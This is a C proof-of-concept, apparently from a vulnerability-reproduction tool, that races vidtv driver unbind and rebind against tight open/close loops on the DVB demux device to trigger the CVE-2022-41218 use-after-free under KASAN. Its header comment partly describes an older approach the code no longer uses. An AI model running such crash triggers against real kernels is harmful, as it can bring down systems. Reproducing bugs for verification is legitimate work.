/*
 * CHAINFORGE KASAN crash-trigger for CVE-2022-41218 (CWE-362 race -> CWE-416 UAF, dvb_dmxdev).
 * Race: dvb_dmxdev_release() wakes dvbdev->wait_queue while dvb_dmxdev_stop() tears down the
 * tuning kthread. Opening frontend0 and kicking the frontend kthread (FE_SET_* ioctls / tune),
 * then racing teardown, reads the freed dvb_dmxdev/fops. Reaches the bug via vidtv's frontend0.
 * NOT an exploit. A KASAN UAF in the dvb_dmxdev path is the witness for THIS CVE specifically.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/dev/dvb/adapter0/demux0"
static volatile int stop_open = 0;

/* Open the frontend and issue ioctls that kick the tuning kthread, so dvb_dmxdev_stop()
 * (on teardown) races dvb_dmxdev_release(). Loop tightly. */
static void *opener(void *arg) {
    (void)arg;
    /* Rapid open/close on frontend0 racing teardown. The UAF is on the per-open fops that
     * dvb_free_device() frees during disconnect; a non-blocking open racing the free reads it.
     * FE_SET_* ioctls were dropped — on vidtv they can block indefinitely (repro hung before the
     * teardown loop). O_NONBLOCK keeps open() from blocking in dvb_dmxdev_open(). */
    while (!stop_open) {
        int fd = open(TARGET, O_RDONLY | O_NONBLOCK);
        if (fd >= 0) close(fd);
    }
    return NULL;
}

static int write_str(const char *path, const char *val) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, val, strlen(val));
    close(fd);
    return n < 0 ? -1 : 0;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    const char *UNBIND = "/sys/bus/platform/drivers/vidtv/unbind";
    const char *BIND = "/sys/bus/platform/drivers/vidtv/bind";
    const char *DEV = "vidtv.0";
    for (int i = 0; i < 20 && access(TARGET, F_OK) != 0; i++) usleep(100000);
    if (access(TARGET, F_OK) != 0) printf("[cf] warning: %s absent\n", TARGET);

    pthread_t a, b, c;
    pthread_create(&a, NULL, opener, NULL);
    pthread_create(&b, NULL, opener, NULL);
    pthread_create(&c, NULL, opener, NULL);

    const int rounds = 4000;
    for (int i = 0; i < rounds; i++) {
        if (write_str(UNBIND, DEV) != 0) {
            system("/bin/busybox rmmod vidtv 2>/dev/null");
            system("/bin/busybox modprobe vidtv 2>/dev/null");
        } else {
            usleep(150);
            write_str(BIND, DEV);
        }
        if ((i & 0xff) == 0) printf("[cf] demux teardown round %d/%d\n", i, rounds);
    }
    stop_open = 1;
    pthread_join(a, NULL);
    pthread_join(b, NULL);
    pthread_join(c, NULL);
    printf("[cf] done %d rounds (no KASAN splat this run)\n", rounds);
    return 0;
}
